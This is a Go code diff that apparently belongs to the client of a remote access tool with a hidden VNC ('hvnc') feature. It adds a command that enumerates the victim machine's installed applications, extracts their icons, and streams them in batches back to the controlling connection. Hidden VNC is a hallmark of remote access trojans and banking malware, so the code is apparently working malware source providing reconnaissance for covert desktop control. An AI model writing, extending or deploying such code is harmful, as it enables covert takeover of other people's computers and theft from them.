@@ -1512,6 +1512,40 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		})
 		return nil
 
+	case "hvnc_installed_apps":
+		log.Printf("hvnc: installed apps enumeration requested")
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_installed_apps", nil, func() {
+			const batchSize = 15
+			apps := enumerateInstalledApps()
+			log.Printf("hvnc: enumerated %d installed apps, extracting icons in batches", len(apps))
+			var batch []wire.HVNCInstalledApp
+			sent := 0
+			for _, a := range apps {
+				batch = append(batch, wire.HVNCInstalledApp{
+					Name:    a.name,
+					ExePath: a.exePath,
+					Icon:    extractIconBase64(a.exePath),
+				})
+				if len(batch) >= batchSize {
+					_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCInstalledAppsResult{
+						Type: "hvnc_installed_apps_result",
+						Apps: batch,
+					})
+					sent += len(batch)
+					batch = batch[:0]
+				}
+			}
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCInstalledAppsResult{
+				Type: "hvnc_installed_apps_result",
+				Apps: batch,
+				Done: true,
+			})
+			sent += len(batch)
+			log.Printf("hvnc: installed apps complete, sent %d apps", sent)
+		})
+		return nil
+
 	case "hvnc_lookup":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		exeName := ""
